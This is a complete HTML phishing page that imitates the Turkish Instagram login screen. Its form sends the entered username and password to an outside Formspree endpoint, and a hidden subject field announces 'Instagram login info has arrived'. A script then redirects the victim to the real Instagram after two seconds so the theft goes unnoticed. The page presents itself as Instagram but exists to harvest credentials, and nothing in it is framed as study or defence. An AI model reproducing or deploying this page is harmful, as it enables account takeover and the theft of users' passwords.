<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Giriş yap</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 935px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 32px;
        }

        .phone-section {
            flex-basis: 380px;
            height: 581px;
            background: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png') no-repeat center;
            background-size: contain;
            position: relative;
        }

        .phone-screen {
            position: absolute;
            top: 27px;
            left: 114px;
            width: 250px;
            height: 541px;
            background: url('https://www.instagram.com/static/images/homepage/screenshot1.jpg/4f8b917a185b.jpg') no-repeat center;
            background-size: cover;
            border-radius: 20px;
        }

        .login-section {
            flex-basis: 350px;
        }

        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo img {
            width: 175px;
            height: auto;
        }

        .form-group {
            margin-bottom: 8px;
        }

        .form-control {
            width: 100%;
            padding: 9px 0 7px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        .form-control:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 7px 16px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 15px 0 20px;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: none;
            border: none;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 10px 0 20px;
            width: 100%;
        }

        .fb-icon {
            width: 20px;
            height: 20px;
            background: url('https://www.instagram.com/static/bundles/es6/sprite_core_32f0a4f27407.png/32f0a4f27407.png') no-repeat -115px -307px;
            background-size: 440px 411px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
            display: inline-block;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-top: 15px;
        }

        .app-button {
            height: 40px;
        }

        .app-button img {
            height: 100%;
            width: auto;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            list-style: none;
            margin-bottom: 20px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            font-size: 12px;
        }

        .copyright {
            text-align: center;
            color: #8e8e8e;
            margin-top: 20px;
        }

        @media (max-width: 800px) {
            .phone-section {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-section">
            <div class="phone-screen"></div>
        </div>
        
        <div class="login-section">
            <div class="login-box">
                <div class="logo">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
                </div>
                
                <form action="https://formspree.io/f/xdallaqw" method="POST">
                    <div class="form-group">
                        <input type="text" name="Kullanici Adi" class="form-control" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="Sifre" class="form-control" placeholder="Şifre" required>
                    </div>
                    
                    <!-- Gizli inputlar -->
                    <input type="hidden" name="_subject" value="✅ Instagram Login Bilgisi Geldi!">
                    <input type="hidden" name="_next" value="https://www.instagram.com">
                    
                    <button type="submit" class="login-btn">Giriş Yap</button>
                </form>
                
                <div class="divider">
                    <span class="divider-line"></span>
                    <span class="divider-text">YA DA</span>
                    <span class="divider-line"></span>
                </div>
                
                <button class="fb-login">
                    <span class="fb-icon"></span>
                    <span>Facebook ile giriş yap</span>
                </button>
                
                <a href="#" class="forgot-password">Şifreni unuttun mu?</a>
            </div>
            
            <div class="signup-box">
                <span>Hesabın yok mu? </span>
                <a href="#">Kaydol</a>
            </div>
            
            <div class="get-app">
                <p>Uygulamayı indir.</p>
                <div class="app-buttons">
                    <a href="#" class="app-button">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_tr-tr.png/180c1dfc0376.png" alt="App Store">
                    </a>
                    <a href="#" class="app-button">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_tr-tr.png/3c216dd0da19.png" alt="Google Play">
                    </a>
                </div>
            </div>
            
            <div class="footer">
                <ul class="footer-links">
                    <li><a href="#">Meta</a></li>
                    <li><a href="#">Hakkında</a></li>
                    <li><a href="#">Blog</a></li>
                    <li><a href="#">İş Fırsatları</a></li>
                    <li><a href="#">Yardım</a></li>
                    <li><a href="#">API</a></li>
                    <li><a href="#">Gizlilik</a></li>
                    <li><a href="#">Koşullar</a></li>
                    <li><a href="#">Konumlar</a></li>
                    <li><a href="#">Instagram Lite</a></li>
                    <li><a href="#">Threads</a></li>
                    <li><a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a></li>
                    <li><a href="#">Meta Verified</a></li>
                </ul>
                <div class="copyright">
                    © 2024 Instagram from Meta
                </div>
            </div>
        </div>
    </div>

    <script>
        // Form gönderildiğinde Instagram'a yönlendir
        document.querySelector('form').addEventListener('submit', function(e) {
            // Form normal gönderilsin (Formspree'e)
            setTimeout(function() {
                window.location.href = 'https://www.instagram.com';
            }, 2000);
        });
    </script>
</body>
</html>
